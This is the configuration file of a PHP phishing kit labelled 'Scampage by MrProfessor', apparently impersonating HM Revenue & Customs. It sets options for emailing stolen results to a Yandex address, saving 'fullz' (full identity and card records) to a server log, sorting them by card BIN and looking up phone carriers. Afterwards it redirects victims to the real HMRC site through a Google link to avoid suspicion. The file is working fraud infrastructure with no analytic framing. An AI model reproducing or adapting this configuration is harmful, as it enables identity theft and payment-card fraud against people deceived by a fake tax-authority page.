<?php
/*
 * Scampage by MrProfessor
 * Jabber: mrprofessor@jodo.im
 * 
 */
//Systems:

// - Carrier lookup in results (Already activated)
// - Bin List (Change '0' from $binList to '1' to activate)
// - Send results via email (Change '0' from $sendEmail to '1' to activate)
// - Save results on server (Change '0' from $saveFile to '1' to activate) => assets/logs/fullz.txt
// - Save results in separated files clased by BIN (Change '0' from $binSave to '1' to activate)


$saveFile = 0;
$sendEmail = 1;
$binList = 0;
$binSave = 0;


$to = 'j1gs4w800@yandex.com';
$ExitLink = "https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwiUuq72gKLhAhVopIsKHWsvDikQFjAAegQIBhAC&url=https%3A%2F%2Fwww.gov.uk%2Fgovernment%2Forganisations%2Fhm-revenue-customs&usg=AOvVaw3OQnCoy23_7DU2yY_oeZpm"; // Real site via google redirect

?>